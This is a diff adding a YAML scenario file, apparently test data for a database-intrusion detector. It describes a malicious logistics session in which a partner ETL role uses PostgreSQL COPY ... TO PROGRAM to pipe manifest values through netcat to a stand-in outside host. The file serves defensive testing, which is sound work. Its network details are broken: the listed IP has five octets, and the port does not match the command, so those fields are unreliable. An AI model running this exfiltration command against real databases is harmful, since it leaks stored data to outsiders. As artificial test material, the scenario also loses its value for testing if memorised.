@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_25_copy_to_program_mal_640m
+family_id: gen_logistics_25_copy_to_program_fam_640
+domain: logistics
+time_of_day: '22:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT declared_value FROM manifests) TO PROGRAM 'nc deid-partner.example
+      443'
+    connects_to:
+      ip: 194.147.78.75.13
+      port: 8443
+matched_pair_id: gen_logistics_25_copy_to_program_pair_640
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
